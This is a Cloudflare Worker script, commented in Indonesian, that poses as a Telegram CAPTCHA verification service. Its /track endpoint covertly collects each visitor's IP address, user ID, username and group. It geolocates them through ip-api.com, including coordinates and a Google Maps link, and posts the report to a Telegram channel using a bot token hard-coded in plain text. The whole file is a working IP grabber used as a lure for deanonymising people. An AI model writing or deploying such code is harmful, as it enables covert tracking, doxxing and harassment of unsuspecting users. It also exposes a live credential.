// ============================================
// CLOUDFLARE WORKER - CAPTCHA & IP TRACKER
// KIRIM LAPORAN KE CHANNEL TELEGRAM
// ============================================

// KONFIGURASI
const BOT_TOKEN = "8237599720:AAH0NM_99MrjPRDp7vsi9SPuzZLClAn87l4"
const CHANNEL_ID = "-1003752241629"  // ← CHANNEL LO SUDAH DI SET

// ============================================
// MAIN HANDLER
// ============================================
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  const path = url.pathname
  
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Max-Age': '86400'
  }
  
  if (request.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }
  
  if (path === '/track') {
    return handleTracking(request, url, corsHeaders)
  }
  
  if (path === '/captcha') {
    return handleCaptcha(request, url, corsHeaders)
  }
  
  if (path === '/test') {
    return handleTest(request, corsHeaders)
  }
  
  return new Response(JSON.stringify({
    status: 'error',
    message: 'Endpoint not found',
    endpoints: ['/track', '/captcha', '/test']
  }), {
    status: 404,
    headers: { 'Content-Type': 'application/json', ...corsHeaders }
  })
}

// ============================================
// HANDLER TRACKING IP - KIRIM KE CHANNEL
// ============================================
async function handleTracking(request, url, corsHeaders) {
  // Dapetin IP asli dari Cloudflare
  const clientIP = request.headers.get('CF-Connecting-IP') || 
                   request.headers.get('X-Forwarded-For') || 
                   'unknown'
  
  // Dapetin data dari query parameter
  const userId = url.searchParams.get('user_id') || 'unknown'
  const username = url.searchParams.get('username') || 'unknown'
  const groupId = url.searchParams.get('group_id') || 'unknown'
  
  // Dapetin header tambahan
  const userAgent = request.headers.get('User-Agent') || 'unknown'
  
  // Ambil info IP detail dari ip-api.com
  let ipDetails = {
    status: 'fail',
    city: 'N/A',
    region: 'N/A',
    country: 'N/A',
    lat: 0,
    lon: 0,
    isp: 'N/A',
    mobile: false,
    proxy: false
  }
  
  try {
    const ipResponse = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,country,regionName,city,lat,lon,isp,org,mobile,proxy,query`)
    const data = await ipResponse.json()
    if (data.status === 'success') {
      ipDetails = {
        status: 'success',
        city: data.city || 'N/A',
        region: data.regionName || 'N/A',
        country: data.country || 'N/A',
        lat: data.lat || 0,
        lon: data.lon || 0,
        isp: data.isp || 'N/A',
        org: data.org || 'N/A',
        mobile: data.mobile || false,
        proxy: data.proxy || false,
        ip: data.query || clientIP
      }
    }
  } catch (e) {
    console.log('IP lookup error:', e)
  }
  
  // ============================================
  // FORMAT PESAN UNTUK CHANNEL
  // ============================================
  
  let reportMessage = `🚨 *NEW CAPTCHA VERIFICATION* 🚨\n\n`
  reportMessage += `*👤 USER INFO:*\n`
  reportMessage += `User ID: \`${userId}\`\n`
  reportMessage += `Username: @${username}\n`
  if (groupId !== 'unknown') {
    reportMessage += `Group ID: \`${groupId}\`\n`
  }
  reportMessage += `\n*🌐 IP & LOCATION:*\n`
  reportMessage += `IP Address: \`${clientIP}\`\n`
  
  if (ipDetails.status === 'success') {
    reportMessage += `📍 City: ${ipDetails.city}\n`
    reportMessage += `📍 Region: ${ipDetails.region}\n`
    reportMessage += `📍 Country: ${ipDetails.country}\n`
    reportMessage += `📡 ISP: ${ipDetails.isp}\n`
    reportMessage += `📱 Mobile: ${ipDetails.mobile ? 'Yes' : 'No'}\n`
    reportMessage += `🔒 Proxy/VPN: ${ipDetails.proxy ? 'Yes' : 'No'}\n`
    
    if (ipDetails.lat && ipDetails.lon) {
      reportMessage += `\n🗺️ *Location Map:*\n`
      reportMessage += `https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon}\n`
    }
  } else {
    reportMessage += `Location lookup failed\n`
  }
  
  reportMessage += `\n*🕐 TIME:* ${new Date().toLocaleString('id-ID')}\n`
  reportMessage += `*📱 User Agent:* ${userAgent.substring(0, 80)}`
  
  // ============================================
  // KIRIM KE CHANNEL TELEGRAM
  // ============================================
  try {
    const sendUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`
    
    const response = await fetch(sendUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHANNEL_ID,
        text: reportMessage,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    })
    
    const result = await response.json()
    if (!result.ok) {
      console.log('Telegram API error:', result)
    }
  } catch (e) {
    console.log('Telegram send error:', e)
  }
  
  // Return response ke bot
  const responseData = {
    status: 'success',
    timestamp: new Date().toISOString(),
    ip: clientIP,
    location: ipDetails.status === 'success' ? {
      city: ipDetails.city,
      region: ipDetails.region,
      country: ipDetails.country,
      lat: ipDetails.lat,
      lon: ipDetails.lon,
      isp: ipDetails.isp,
      mobile: ipDetails.mobile,
      proxy: ipDetails.proxy
    } : null
  }
  
  return new Response(JSON.stringify(responseData), {
    status: 200,
    headers: { 'Content-Type': 'application/json', ...corsHeaders }
  })
}

// ============================================
// HANDLER CAPTCHA IMAGE GENERATOR
// ============================================
async function handleCaptcha(request, url, corsHeaders) {
  let captchaText = url.searchParams.get('text')
  if (!captchaText) {
    captchaText = generateRandomText(6)
  }
  
  const svg = generateCaptchaSVG(captchaText)
  
  return new Response(svg, {
    status: 200,
    headers: {
      'Content-Type': 'image/svg+xml',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
      ...corsHeaders
    }
  })
}

// ============================================
// HANDLER TEST
// ============================================
async function handleTest(request, corsHeaders) {
  const testData = {
    status: 'success',
    message: 'Cloudflare Worker is running!',
    bot_token_configured: true,
    channel_id: CHANNEL_ID,
    timestamp: new Date().toISOString(),
    endpoints: {
      track: '/track?user_id=123&username=test',
      captcha: '/captcha?text=ABC123',
      test: '/test'
    }
  }
  
  return new Response(JSON.stringify(testData), {
    status: 200,
    headers: { 'Content-Type': 'application/json', ...corsHeaders }
  })
}

// ============================================
// HELPER FUNCTIONS
// ============================================

function generateRandomText(length = 6) {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += chars[Math.floor(Math.random() * chars.length)]
  }
  return result
}

function generateCaptchaSVG(text) {
  const chars = text.split('')
  const width = 280
  const height = 100
  
  let svg = `<svg width="${width}" height="${height}" xmlns="http://www.w3.org/2000/svg">`
  svg += `<rect width="${width}" height="${height}" fill="#1a1a2e"/>`
  
  // Random dots
  for (let i = 0; i < 150; i++) {
    const x = Math.random() * width
    const y = Math.random() * height
    svg += `<circle cx="${x}" cy="${y}" r="1.5" fill="#ffffff" opacity="${Math.random() * 0.5}"/>`
  }
  
  // Random lines
  for (let i = 0; i < 8; i++) {
    const x1 = Math.random() * width
    const y1 = Math.random() * height
    const x2 = Math.random() * width
    const y2 = Math.random() * height
    svg += `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="#e94560" stroke-width="1.5" opacity="${Math.random() * 0.6 + 0.2}"/>`
  }
  
  // Teks captcha
  const startX = 25
  const colors = ['#e94560', '#ff6b6b', '#c084fc', '#60a5fa', '#34d399', '#fbbf24']
  
  chars.forEach((char, i) => {
    const x = startX + (i * 38)
    const y = 55 + (Math.random() * 20 - 10)
    const rotate = Math.random() * 30 - 15
    const fontSize = 32 + (Math.random() * 8 - 4)
    const color = colors[i % colors.length]
    
    svg += `<text x="${x}" y="${y}" fill="${color}" font-size="${fontSize}" font-family="monospace" font-weight="bold" transform="rotate(${rotate}, ${x}, ${y})" opacity="0.9">${char}</text>`
  })
  
  svg += `</svg>`
  return svg
}
